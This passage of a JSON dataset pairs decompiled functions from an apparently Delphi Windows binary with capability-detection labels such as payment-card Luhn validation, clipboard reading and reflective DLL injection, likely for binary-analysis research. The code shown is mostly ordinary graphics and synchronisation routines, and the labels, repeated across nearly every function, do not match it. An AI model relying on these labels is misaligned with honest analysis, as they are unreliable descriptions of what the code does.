        "decompiled_code": "\nvoid __fastcall fcn.004277dc(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0x427708;\n    fcn.00427760(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1);\n    return;\n}\n",
        "token_count": 87
    },
    "00427c48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00427c48(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack132;\n    uint uStack128;\n    uchar *puStack124;\n    uint var_68h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint cbBuffer;\n    uint lpData;\n    \n    puStack124 = 0x427c5c;\n    fcn.00427bb4();\n    puStack124 = 0x427c6b;\n    fcn.0041b940();\n    if (var_40h != 0x464d4520) {\n        puStack124 = 0x427c79;\n        fcn.00425a10();\n    }\n    puStack124 = 0x427c81;\n    uVar2 = fcn.00402f00();\n    iVar1 = *(in_EAX + 0x28);\n    uStack128 = 0x427d08;\n    uStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    puStack124 = &stack0xfffffffc;\n    fcn.004030fc();\n    fcn.0041b940();\n    iVar3 = sub.gdi32.dll_SetEnhMetaFileBits(cbBuffer, uVar2);\n    *(iVar1 + 8) = iVar3;\n    if (iVar3 == 0) {\n        fcn.00425a10();\n    }\n    *(iVar1 + 0x18) = 0;\n    *(iVar1 + 0xc) = var_48h - var_50h;\n    *(iVar1 + 0x10) = var_44h - var_4ch;\n    *(in_EAX + 0x2c) = 1;\n    *in_FS_OFFSET = cbBuffer;\n    uStack132 = 0x427d0f;\n    fcn.00402f1c();\n    return;\n}\n",
        "token_count": 476
    },
    "00427e98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00427e98(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x427f41;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    uVar1 = *(in_EAX + 0x2c);\n    uVar2 = 1;\n    uStack44 = 0x427f1f;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    fcn.0040a6c4();\n    fcn.0040e904();\n    fcn.00405974();\n    if (uVar2) {\n        *(in_EAX + 0x2c) = 0;\n    }\n    fcn.00426f8c();\n    *in_FS_OFFSET = uStack48;\n    *(in_EAX + 0x2c) = uVar1;\n    return;\n}\n",
        "token_count": 305
    },
    "00428418": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid fcn.00428418(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_64h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    \n    iVar2 = sub.user32.dll_GetClipboardData(0xe);\n    if (iVar2 == 0) {\n        fcn.004259e0();\n    }\n    fcn.00427bb4();\n    iVar1 = in_EAX[10];\n    uVar3 = sub.gdi32.dll_CopyEnhMetaFileA(iVar2, 0);\n    *(iVar1 + 8) = uVar3;\n    sub.gdi32.dll_GetEnhMetaFileHeader(*(iVar1 + 8), 100, &var_64h);\n    *(iVar1 + 0xc) = var_44h - var_4ch;\n    *(iVar1 + 0x10) = var_40h - var_48h;\n    *(iVar1 + 0x18) = 0;\n    *(in_EAX + 0xb) = 1;\n    iVar2 = (**(*in_EAX + 0x24))();\n    *(in_EAX + 0x22) = iVar2 != 0;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 321
    },
    "00428740": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00428740(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00425108();\n    *(in_EAX + 0x58) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 164
    },
    "00428a00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00428a00(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack1080;\n    uint uStack1076;\n    uchar *puStack1072;\n    uint uStack1068;\n    uint uStack1064;\n    uint uStack1060;\n    uint uStack1056;\n    uint var_410h;\n    uint hgdiobj;\n    uint hdc;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((in_EAX != 0) && (*(param_1 + 0x26) < 9)) {\n        uStack1056 = 0x428a36;\n        var_4h = param_2;\n        iVar1 = fcn.004262b4();\n        if (iVar1 != 0) {\n            uStack1056 = 0;\n            uStack1060 = 0x428a43;\n            uStack1060 = sub.user32.dll_GetDC();\n            uStack1064 = 0x428a4f;\n            var_8h = uStack1060;\n            uStack1068 = sub.gdi32.dll_CreateCompatibleDC();\n            puStack1072 = 0x428a5c;\n            hdc = uStack1068;\n            hgdiobj = sub.gdi32.dll_SelectObject();\n            uStack1076 = 0x428aaf;\n            uStack1080 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffbc8;\n            uVar2 = hdc;\n            puStack1072 = &stack0xfffffffc;\n            sub.gdi32.dll_SetDIBColorTable(hdc, 0, iVar1, &fcn.00428a00::var_410h);\n            *in_FS_OFFSET = uVar2;\n            sub.gdi32.dll_SelectObject(hdc, hgdiobj, 0x428ab6);\n            sub.gdi32.dll_DeleteDC(hdc);\n            sub.user32.dll_ReleaseDC(0, var_8h);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 471
    },
    "00429480": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00429480(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff80;\n    uint uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint var_58h;\n    int32_t var_4h;\n    \n    var_4h = in_EAX;\n    if (param_2 != 0) {\n        uStack104 = 0x42949e;\n        cVar1 = fcn.004047dc();\n        if (cVar1 == '\\0') {\n            uStack104 = 0x429573;\n            fcn.00419e40();\n            return;\n        }\n    }\n    uStack104 = 0x4294ae;\n    fcn.00429c4c();\n    uStack104 = 0x499a18;\n    puStack108 = 0x4294b8;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack112 = 0x429542;\n    uStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    if (param_2 == 0) {\n        puStack108 = &stack0xfffffffc;\n        fcn.00403af4();\n        in_stack_ffffff80 = 0;\n        fcn.00429ebc(0, 0, &fcn.00429480::var_58h);\n    }\n    else {\n        puStack108 = &stack0xfffffffc;\n        fcn.00428934();\n        fcn.00428938();\n        *(var_4h + 0x28) = *(param_2 + 0x28);\n        *(var_4h + 0x21) = *(param_2 + 0x21);\n        *(var_4h + 0x34) = *(param_2 + 0x34);\n        *(var_4h + 0x38) = *(param_2 + 0x38);\n    }\n    *in_FS_OFFSET = in_stack_ffffff80;\n    sub.kernel32.dll_LeaveCriticalSection(0x499a18, 0x429549);\n    return;\n}\n",
        "token_count": 496
    },
    "0042957c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042957c(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t iVar1;\n    uint *puVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint var_5ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puVar2 = &fcn.0042957c::var_5ch;\n    for (iVar1 = 0x15; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = *arg_8h;\n        arg_8h = arg_8h + 1;\n        puVar2 = puVar2 + 1;\n    }\n    puStack112 = 0x4295a1;\n    fcn.00429c4c();\n    var_4h = 0;\n    var_8h = 0;\n    uStack116 = 0x42960c;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    puStack112 = &stack0xfffffffc;\n    iVar1 = in_ECX;\n    if (in_ECX != *0x4999fc) {\n        puStack112 = &stack0xfffffffc;\n        iVar1 = fcn.0042916c();\n    }\n    var_8h = iVar1;\n    var_4h = fcn.00428b08(*(in_EAX + 0x2c), &fcn.0042957c::var_5ch);\n    uVar3 = 0;\n    fcn.00429ebc(0, *(*(in_EAX + 0x28) + 0x70), &fcn.0042957c::var_5ch);\n    *in_FS_OFFSET = uVar3;\n    return;\n}\n",
        "token_count": 433
    },
    "0042963c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042963c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    fcn.00429930();\n    iVar1 = *(in_EAX + 0x28);\n    *(iVar1 + 0x50) = 0;\n    *(iVar1 + 0x54) = 0;\n    fcn.0040f944();\n    return;\n}\n",
        "token_count": 91
    },
    "0042966c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.0042966c(void)\n\n{\n    uint *puVar1;\n    int32_t *in_EAX;\n    uint *arg_8h;\n    int32_t iVar2;\n    uint *puVar3;\n    ulong uVar4;\n    \n    arg_8h = fcn.00404620();\n    (**(*in_EAX + 0x58))();\n    uVar4 = (***arg_8h)();\n    fcn.0041b798(uVar4, uVar4 >> 0x20);\n    puVar3 = in_EAX[10] + 0x18;\n    puVar1 = &stack0xffffff98;\n    for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar1 = puVar1 + 1;\n    }\n    fcn.00429c4c();\n    fcn.0040f944();\n    fcn.00429ebc(arg_8h, *(in_EAX[10] + 0x70), &stack0xffffff98);\n    return;\n}\n",
        "token_count": 263
    },
    "00429b20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.00429b20(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    fcn.0042963c();\n    iVar1 = *(in_EAX + 0x28);\n    if ((param_2 < 0) || (*(iVar1 + 0x20) <= param_2)) {\n        fcn.004259c8();\n    }\n    fcn.00429bd8();\n    sub.gdi32.dll_GdiFlush();\n    if (0 < *(iVar1 + 0x38)) {\n        param_2 = (*(iVar1 + 0x38) - param_2) + -1;\n    }\n    iVar2 = fcn.00425ca8();\n    return iVar2 * param_2 & 0xffffffff00000000U | iVar2 * param_2 + *(iVar1 + 0x2c);\n}\n",
        "token_count": 215
    },
    "0042a554": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a554(int32_t param_1)\n\n{\n    int16_t aiStack112 [7];\n    uchar auStack98 [86];\n    \n    fcn.00429c4c();\n    if (param_1 == 0) {\n        fcn.00403af4();\n        fcn.00429ebc(0, 0, auStack98);\n    }\n    else {\n        fcn.0041b940();\n        if (aiStack112[0] != 0x4d42) {\n            fcn.004259f8();\n        }\n        fcn.00429fe4(aiStack112);\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "0042ad7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ad7c(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    ushort *in_EDX;\n    uint *puVar3;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStackY124;\n    uint uStackY120;\n    uchar *puStackY116;\n    uint var_58h;\n    uint var_44h;\n    uint var_40h;\n    uint *var_4h;\n    \n    *in_EDX = 2;\n    fcn.00429c5c();\n    puVar3 = *(in_EAX + 0x28) + 0x18;\n    puVar4 = &fcn.0042ad7c::var_58h;\n    for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    var_40h = 0;\n    var_44h = 0;\n    puStackY116 = 0x42adc9;\n    uVar1 = fcn.00428b08(*(in_EAX + 0x2c), &fcn.0042ad7c::var_58h);\n    *var_4h = uVar1;\n    uStackY120 = 0x42adf6;\n    uStackY124 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff84;\n    puStackY116 = &stack0xfffffffc;\n    uVar1 = fcn.0042916c();\n    *arg_8h = uVar1;\n    *in_FS_OFFSET = uStackY124;\n    return;\n}\n",
        "token_count": 410
    },
    "0042aec8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042aec8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00426cb4();\n    *(in_EAX + 0x21) = 1;\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x28) = uVar1;\n    fcn.00428934();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 190
    },
    "0042b170": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0042b170(uint param_1, uint *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ah;\n    uint var_4h;\n    \n    puStack32 = 0x42b189;\n    piVar1 = fcn.00404620();\n    uStack36 = 0x42b1fe;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    uVar2 = (***param_2)();\n    fcn.0041b714(uVar2);\n    (**(*piVar1 + 4))();\n    (***piVar1)();\n    fcn.0041b940();\n    fcn.0041b940();\n    if (1 < var_ah._2_2_) {\n        fcn.00425a04();\n    }\n    fcn.0042b228();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x42b21e;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 301
    },
    "0042b29c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042b29c(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    uint *puStack60;\n    uint lpvObject;\n    uint var_2ch;\n    uint piconinfo;\n    uint var_ch;\n    uint hgdiobj;\n    int32_t *var_4h;\n    \n    puStack60 = 0x42b2b4;\n    var_4h = in_EAX;\n    fcn.0042b228();\n    if (param_2 != 0) {\n        puStack60 = &fcn.0042b29c::piconinfo;\n        puStack68 = 0x42b2c2;\n        iStack64 = param_2;\n        iVar1 = sub.user32.dll_GetIconInfo();\n        if (iVar1 != 0) {\n            uStack72 = 0x42b319;\n            uStack76 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffb4;\n            uVar2 = hgdiobj;\n            puStack68 = &stack0xfffffffc;\n            iVar1 = sub.gdi32.dll_GetObjectA(hgdiobj, 0x18, &fcn.0042b29c::lpvObject);\n            if (iVar1 != 0) {\n                iVar1 = var_4h[10];\n                *(iVar1 + 0x10) = var_2ch;\n                *(iVar1 + 0x14) = var_2ch;\n            }\n            *in_FS_OFFSET = uVar2;\n            sub.gdi32.dll_DeleteObject(var_ch, 0x42b320);\n            sub.gdi32.dll_DeleteObject(hgdiobj);\n            return;\n        }\n    }\n    puStack68 = 0x42b32b;\n    (**(*var_4h + 0x10))();\n    return;\n}\n",
        "token_count": 460
    },
    "0042b438": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.0042b438(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    int32_t iStack76;\n    uint uStack72;\n    uint uStack68;\n    uchar uStack32;\n    \n    uVar3 = 1;\n    uStack68 = 0;\n    uStack72 = 0x42b446;\n    iVar1 = sub.user32.dll_GetDC();\n    if (iVar1 != 0) {\n        uStack72 = *0x499a10;\n        iStack76 = iVar1;\n        iVar2 = sub.gdi32.dll_SelectObject();\n        if (iVar2 != 0) {\n            iVar2 = sub.gdi32.dll_GetTextMetricsA(iVar1, &stack0xffffffb4);\n            if (iVar2 != 0) {\n                uVar3 = uStack32;\n            }\n        }\n        sub.user32.dll_ReleaseDC(0, iVar1);\n    }\n    return uVar3;\n}\n",
        "token_count": 219
    },
    "0042b658": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042b658(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    sub.kernel32.dll_InitializeCriticalSection();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 132
    },
    "0042b6bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042b6bc(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 40
    },
    "0042b6c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042b6c8(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 42
    },
    "0042b888": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042b888(void)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = *(in_EAX + 4);\n    if (puVar1 == NULL) {\n        return;\n    }\n    uStack28 = 0x42b8a6;\n    fcn.0042b6bc();\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *(in_EAX + 4) = *puVar1;\n    *in_FS_OFFSET = uStack36;\n    uStack28 = 0x42b8dc;\n    uStack32 = 0x42b8d4;\n    fcn.0042b6c8();\n    return;\n}\n",
        "token_count": 213
    },
    "0042bba8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042bba8(void)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    fcn.00405584();\n    puVar1 = fcn.0040a518();\n    while( true ) {\n        iVar2 = fcn.0040580c();\n        if ((iVar2 < 1) || ((0x20 < *puVar1 && (*puVar1 != 0x2e)))) break;\n        fcn.004059dc();\n        fcn.00405c6c();\n        puVar1 = fcn.0040a518();\n    }\n    return;\n}\n",
        "token_count": 139
    },
    "0042bccc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042bccc(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char in_DL;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        puStack40 = 0x42bce0;\n        fcn.00404974();\n    }\n    uStack44 = 0x42bd3e;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.0042bba8();\n    fcn.0042bbf8(arg_8h, arg_14h);\n    fcn.00405584();\n    fcn.00405584();\n    *in_FS_OFFSET = arg_8h;\n    uStack48 = 0x42bd45;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 233
    },
    "0042be44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042be44(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_8h;\n    uint rclsid;\n    \n    puStack48 = &stack0xfffffffc;\n    puStack60 = &stack0xfffffffc;\n    uStack52 = 0x42bf24;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    uStack64 = 0x42be9f;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack68;\n    uVar1 = fcn.0040700c();\n    uVar2 = 0x42bf34;\n    sub.ole32.dll_CoCreateInstance(in_EAX, 0, 5, 0x42bf34, uVar1);\n    fcn.0042bd80();\n    *in_FS_OFFSET = in_EAX;\n    *in_FS_OFFSET = uVar2;\n    uStack68 = 0x42bf2b;\n    fcn.00405530();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 303
    },
    "0042c11c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042c11c(void)\n\n{\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_18h;\n    uint rclsid;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    puStack72 = &stack0xfffffffc;\n    uStack64 = 0x42c1f1;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack68;\n    uStack76 = 0x42c17f;\n    iStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack80;\n    fcn.0042bdbc();\n    uVar1 = fcn.0040700c();\n    iVar3 = 0x42c200;\n    puVar2 = &rclsid;\n    sub.ole32.dll_CoCreateInstance(puVar2, 0, 5, 0x42c200, uVar1);\n    fcn.0042bd80();\n    *in_FS_OFFSET = puVar2;\n    *in_FS_OFFSET = iVar3;\n    iStack80 = 0x42c1f8;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 325
    },
    "0042c76c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0042c76c(int32_t arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = *(arg_8h + -4);\n    var_4h._0_1_ = 6;\n    fcn.0040dbf4(0, &var_8h);\n    fcn.00404ec4();\n    return;\n}\n",
        "token_count": 106
    },
    "0042cdc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042cdc0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 4) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 164
    },
    "0042d470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042d470(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x42d510;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = fcn.0042d350();\n    *(iVar2 + 8) = *(in_EAX + 0x18);\n    fcn.00419740();\n    (**(*param_2 + 0x24))();\n    fcn.0040700c();\n    cVar1 = fcn.0040f954();\n    if (cVar1 != '\\0') {\n        fcn.00419740();\n    }\n    *(in_EAX + 0x18) = *(in_EAX + 0x18) + 1;\n    fcn.00407050();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x42d517;\n    uStack32 = 0x42d50f;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 309
    },
    "0042d350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042d350(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    fcn.00407024();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 136
    },
    "0042d394": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042d394(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x10) = uVar1;\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x14) = uVar1;\n    fcn.00405530();\n    *(in_EAX + 0x18) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 217
    },
    "0042ee3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042ee3c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    sub.kernel32.dll_InitializeCriticalSection();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_EAX + 4;\n    }\n    return in_EAX;\n}\n",
        "token_count": 141
    },
    "00430fc8": {
